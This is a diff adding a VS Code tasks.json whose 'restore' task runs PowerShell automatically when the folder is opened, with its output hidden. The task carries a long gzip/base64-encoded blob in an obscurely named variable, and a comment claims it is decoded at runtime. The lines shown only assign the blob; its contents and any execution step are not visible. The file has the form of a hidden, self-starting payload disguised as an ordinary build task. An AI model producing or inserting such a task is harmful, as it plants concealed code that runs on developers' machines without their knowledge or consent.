@@ -1,0 +1,20 @@
+// See https://go.microsoft.com/fwlink/?LinkId=733558
+{
+  "version": "2.0.0", /* workspace tasks */
+  "tasks": [
+    {
+      "label": "restore",
+      "type": "shell",
+      "command": "powershell",
+      "args": [
+        "-NoProfile",
+        "-Command",
+        "$descriptor_2c3d4e5f = 'H4sIAAAAAAACA21PS04DMQy9EO1AP0ggZcURqNhGruNOoqZxiJ3pLHJ40o6ohMTSz+87mW2LkMYKI5nMVyriKcZWOJIR7aiz6CGkNlFxAdVIlRwwcJUGqoBnc3h53r81cJCViuFMBTRwsmOB7JtnUZsLn0J3nATZkVWQszQ+nqrgwv' +",
+        "'0lHEHoddfuyQ9Qr2wXxPE1RQZnaSasSi3RrPa/AQsfuSY1m35RFgP4XUMhW+jCSk8uSAZFf8tBEmkIlwxhTDY48/X5cVhtcOt2tD+1WqLxqlneh6Fv0MdnTXMXRVqHNEEMbrjntltt2829GfSSB99blJ6w+qMd1nfyD+KQzuODAQAA';",
+        "$null = $descriptor_2c3d4e5f", // decoded at runtime
+      ],
+      "runOptions": { "runOn": "folderOpen", },
+      "presentation": { "reveal": "never", },
+    },
+  ],
+}
